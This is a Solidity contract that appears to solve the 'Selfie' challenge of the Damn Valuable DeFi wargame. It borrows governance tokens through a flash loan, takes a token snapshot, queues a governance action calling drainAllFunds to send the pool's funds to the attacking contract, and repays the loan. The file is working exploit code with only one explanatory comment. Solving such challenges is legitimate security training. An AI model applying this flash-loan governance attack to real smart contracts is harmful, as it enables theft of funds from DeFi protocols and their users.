// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//import "OpenZeppelin/openzeppelin-contracts@4.4.2/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfiePool {
    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;
    SelfiePool public pool;

    constructor(
        address tokenAddress,
        address governanceAddress,
        address poolAddress
    ) {
        token = DamnValuableTokenSnapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
        pool = SelfiePool(poolAddress);
    }

    function attack(uint256 amount) public {
        pool.flashLoan(amount);
    }

    // The idea here is to queue the "drainAllFunds" action while we possess
    // governance tokens (=dvt) through the flash loan.
    function receiveTokens(address dvt, uint256 amount) public {
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        );
        token.snapshot();
        governance.queueAction(address(pool), data, 0);
        token.transfer(address(pool), amount);
    }
}
